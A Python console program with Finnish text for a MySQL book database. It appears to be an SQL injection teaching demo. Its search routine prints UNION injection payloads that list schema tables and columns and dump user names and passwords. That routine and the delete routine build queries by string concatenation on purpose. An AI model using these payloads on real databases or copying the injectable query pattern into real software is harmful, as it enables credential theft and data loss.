import mysql.connector as con
import sys

global mydb


def kysyKirja(mydb):
	print("#"*50)
	print("Tässä kun tekee queryn kirjasta huomataan että käytössä on 3 kenttää joten sql injektioidenkin tulee käyttää 3 kenttää yhdistäessä queryjä.\n")
	print("Tässä voi tehdä UNION sql injektion ja kysyä käyttäjänimet taulusta users")
	print("%' UNION SELECT kirjat.Title, users.username, users.pass FROM users, kirjat WHERE Username LIKE '%A\n")
	print("Jos users taulun kenttien nimet eivät ole tiedossa saa tiedon näinkin")
	print("Tällä saa taulujen nimet")
	print("%' UNION SELECT Title, information_schema.tables.table_name, information_schema.tables.table_schema FROM Kirjat  NATURAL JOIN information_schema.tables#\n")
	print("Tällä saa column nimet taulusta users")
	print("%' UNION SELECT Title, information_schema.columns.COLUMN_NAME, information_schema.columns.table_name FROM Kirjat NATURAL JOIN information_schema.columns WHERE TABLE_NAME LIKE '%users\n")
	print("Tällä saa tiedot taulusta users")
	print("%' UNION SELECT Title, users.* FROM Kirjat  NATURAL JOIN users#\n")
	kirjanNimi = input("Anna kysyttävän kirjan nimi:\n")
	mycursor = mydb.cursor()
	sql = "SELECT * FROM kirjat WHERE Title LIKE '%" + kirjanNimi + "%'"
	mycursor.execute(sql)
	myresult = mycursor.fetchall()
	print("")
	for x in myresult:
		print(x)

def poistaKirja(mydb):
	poistettava = input("Anna poistettavan kirjan nimi:\n")
	mycursor = mydb.cursor()
	sql = "DELETE FROM kirjat WHERE Title = '"+poistettava+"'"
	mycursor.execute(sql)
	mydb.commit()
	print("")
	print(mycursor.rowcount, "kirja poistettu")


def luoKirja():
	kirjanNimi = input("Anna kirjan nimi:")
	kirjailija = input("\nAnna kirjailijan nimi:")
	julkaisuvuosi = input("\nAnna julkaisuvuosi:")
	return {"Title" : kirjanNimi, "Kirjailija" : kirjailija, "Julkaisuvuosi" : julkaisuvuosi}

def lisaaKirja(mydb, kirja):
	importti = mydb.cursor()
	sql = "INSERT INTO kirjat (Title, Kirjailija, Julkaisuvuosi) VALUES (%s, %s, %s)"
	val = (kirja['Title'], kirja['Kirjailija'], kirja['Julkaisuvuosi'])
	importti.execute(sql, val)
	print("")
	mydb.commit()
	print(importti.rowcount, "kirja lisätty.")

def connectMysql():
	mydb = con.connect(host="127.0.0.1", user="**", passwd="**", database="my_db")
	return mydb
def main():
	mydb = connectMysql()
	mycursor = mydb.cursor()
	while (1):
		print("Mitä haluat tehdä:\n")
		print("0. Poistu Ohjelmasta")
		print("1. lisää kirja tietokantaan.")
		print("2. katso löytyykö kirja tietokannasta.")
		print("3. Poista kirja tietokannasta.")
		argument = input("")
		if argument == '0':
			break
		if argument == '1':
			lisaaKirja(mydb, luoKirja())
		if argument == '2':
			kysyKirja(mydb)
		if argument == '3':
			poistaKirja(mydb)
		else:
			continue
	print("Kiitos käynnistä.\n")
	mydb.close()

if __name__ == '__main__':
	main()
